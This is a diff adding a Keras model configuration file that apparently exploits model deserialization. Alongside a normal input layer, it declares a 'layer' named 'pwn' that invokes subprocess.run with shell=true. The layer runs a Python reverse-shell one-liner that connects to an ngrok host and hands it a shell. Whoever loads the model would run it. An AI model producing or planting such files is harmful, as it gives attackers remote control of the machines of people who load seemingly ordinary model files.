@@ -1,0 +1,66 @@
+{
+  "module": "keras.src.models.functional",
+  "class_name": "Functional",
+  "config": {
+    "name": "model",
+    "trainable": true,
+    "layers": [
+      {
+        "module": "keras.layers",
+        "class_name": "InputLayer",
+        "config": {
+          "batch_input_shape": [
+            0,
+            1
+          ],
+          "dtype": "float32",
+          "name": "input_1"
+        },
+        "registered_name": null,
+        "name": "input_1",
+        "inbound_nodes": [
+
+        ]
+      },
+      {
+        "module": "subprocess",
+        "class_name": "run",
+        "config": {
+        },
+        "name": "pwn",
+        "inbound_nodes": [
+            {
+              "args": [
+                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"2.tcp.eu.ngrok.io\",10783));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import subprocess; subprocess.run(\"sh\")'"
+              ],
+              "kwargs": {
+                "shell" : true
+              }
+
+            }
+        ]
+      }
+    ],
+    "input_layers": [
+    ],
+    "output_layers": [
+    ]
+  },
+  "registered_name": "Functional",
+  "build_config": {
+    "input_shape": [
+    ]
+  },
+  "compile_config": {
+    "optimizer": "adam",
+    "loss": "binary_crossentropy",
+    "metrics": [
+      "accuracy"
+    ],
+    "loss_weights": null,
+    "weighted_metrics": null,
+    "run_eagerly": null,
+    "steps_per_execution": null,
+    "jit_compile": null
+  }
+}
